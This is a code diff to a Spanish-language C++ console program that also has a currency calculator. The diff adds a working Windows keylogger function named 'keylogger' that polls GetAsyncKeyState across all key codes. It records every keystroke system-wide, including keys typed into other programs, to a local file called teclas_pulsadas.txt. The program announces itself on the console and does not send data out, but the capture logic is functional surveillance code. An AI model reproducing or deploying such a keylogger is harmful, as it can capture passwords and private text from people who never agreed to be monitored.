@@ -13,6 +13,7 @@
 #include "string"
 #include "regex"
 #include "cstdio"
+#include "unordered_map"
 
 using namespace std;
 
@@ -302,4 +303,61 @@ int calculadoraUSD_GTQ(){
     }
     system("pause");
     return 0;
+}
+
+
+string obtenerNombreTecla(int keyCode) {
+    char nombreTecla[256] = {0 };
+    int scanCode = MapVirtualKey(keyCode, MAPVK_VK_TO_VSC);
+    int result = GetKeyNameTextA(scanCode << 16, nombreTecla, sizeof(nombreTecla));
+    if (result == 0) {
+        return "";
+    }
+    return nombreTecla;
+}
+
+void keylogger(){
+    ofstream outputFile("teclas_pulsadas.txt");
+
+    cout << "Las teclas se estan capturando, Presiona 'Esc' para salir." << endl;
+
+    bool ejecucion = true;
+    unordered_map<int, bool> keyState; // Mapa para mantener el estado de las teclas
+
+    while (ejecucion) {
+        // Iterar sobre todos los posibles códigos de tecla (0-255)
+        for (int keyCode = 0; keyCode < 256; ++keyCode) {
+            if (GetAsyncKeyState(keyCode) & 0x8000) {
+                // La tecla está siendo presionada
+                if (!keyState[keyCode]) {
+                    // La tecla ha sido presionada por primera vez
+                    string keyName = obtenerNombreTecla(keyCode);
+                    if (!keyName.empty()) {
+                        // Guardar la tecla presionada en el archivo
+                        outputFile << keyName << endl;
+
+                        // Mostrar la tecla presionada en la consola
+                        cout << "Tecla '" << keyName << "' registrada." << endl;
+
+                        // Finalizar el programa si se presiona 'Esc'
+                        if (keyCode == VK_ESCAPE) {
+                            ejecucion = false;
+                            break;
+                        }
+                    }
+                }
+                // Marcar la tecla como presionada
+                keyState[keyCode] = true;
+            } else {
+                // La tecla no está siendo presionada
+                keyState[keyCode] = false;
+            }
+        }
+
+        Sleep(10);
+    }
+
+    outputFile.close();
+    cout << "Presiona cualquier tecla para salir." << endl;
+    system("pause");
 }
